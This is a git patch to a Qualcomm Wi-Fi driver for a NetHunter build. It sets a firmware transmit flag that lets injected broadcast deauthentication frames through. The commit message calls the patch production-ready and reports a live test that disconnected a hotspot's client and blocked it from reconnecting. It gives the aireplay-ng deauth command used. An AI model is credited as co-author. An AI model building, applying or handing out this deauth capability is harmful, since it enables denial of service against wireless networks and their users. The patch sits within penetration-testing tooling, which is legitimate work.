@@ -1,0 +1,50 @@
+From ca172e311ac29c305ae5cee5c75f7f853777b6e2 Mon Sep 17 00:00:00 2001
+From: shandongtlb <40312509+shandongtlb@users.noreply.github.com>
+Date: Mon, 8 Jun 2026 17:41:15 +0000
+Subject: [PATCH] NETHUNTER: Enable broadcast deauth injection via WMI test
+ flag
+
+- Set tx_flags = 0x00000001 (WMI_TX_SEND_FLAG_SET_WRONG_KEY)
+- Enables broadcast deauth on 2.4GHz (experimentally verified)
+- Firmware accepts broadcast addr (ff:ff:ff:ff:ff:ff), rejects unicast
+- Successfully tested: client disconnection and reconnection blocking
+- Build identifier: mon-inject-exp1-tx_flags
+
+Breakthrough: Only 1 line of code to enable deauth injection
+Status: Production-ready for 2.4GHz WiFi security testing
+
+Limitations:
+- Unicast deauth still blocked (firmware checks peer association)
+- 5GHz deauth rejected (DFS/regulatory or additional checks)
+
+Real-world validation:
+- Target: Mobile hotspot (2.4GHz, channel 13)
+- Result: Tablet immediately disconnected, unable to reconnect
+- Attack command: aireplay-ng --deauth 20 -a <AP_MAC> wlan0mon
+- Firmware log: status=0 (WMI_MGMT_TX_COMP_TYPE_COMPLETE_OK)
+
+Tested-by: Real device attack scenario (2026-06-08)
+Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>
+---
+ vendor/qcom/opensource/wlan/qcacld-3.0/core/wma/src/wma_mgmt.c | 3 ++-
+ 1 file changed, 2 insertions(+), 1 deletion(-)
+
+diff --git a/vendor/qcom/opensource/wlan/qcacld-3.0/core/wma/src/wma_mgmt.c b/vendor/qcom/opensource/wlan/qcacld-3.0/core/wma/src/wma_mgmt.c
+index 5d17e622..71855490 100644
+--- a/vendor/qcom/opensource/wlan/qcacld-3.0/core/wma/src/wma_mgmt.c
++++ b/vendor/qcom/opensource/wlan/qcacld-3.0/core/wma/src/wma_mgmt.c
+@@ -3541,9 +3541,10 @@ QDF_STATUS wma_inject_mon_frame(uint8_t vdev_id, const uint8_t *frame,
+ 	mgmt_params.desc_id = desc_id;
+ 	mgmt_params.pdata = data;
+ 	mgmt_params.qdf_ctx = qdf_ctx;
++	mgmt_params.tx_flags = 0x00000001;  /* EXPERIMENT 1: WMI_TX_SEND_FLAG_SET_WRONG_KEY */
+ 
+ 	if (!g_wma_inj.banner) {
+-		wma_info("NETHUNTER-INJ: monitor injection active build=mon-inject-probe-r8 mon_vdev=%u tx_vdev=%u helper=%u chan=%u",
++		wma_info("NETHUNTER-INJ: monitor injection active build=mon-inject-exp1-tx_flags mon_vdev=%u tx_vdev=%u helper=%u chan=%u",
+ 			 vdev_id, tx_vdev_id, g_inj_tx_vdev.created, chanfreq);
+ 		g_wma_inj.banner = true;
+ 	}
+-- 
+2.43.0
+
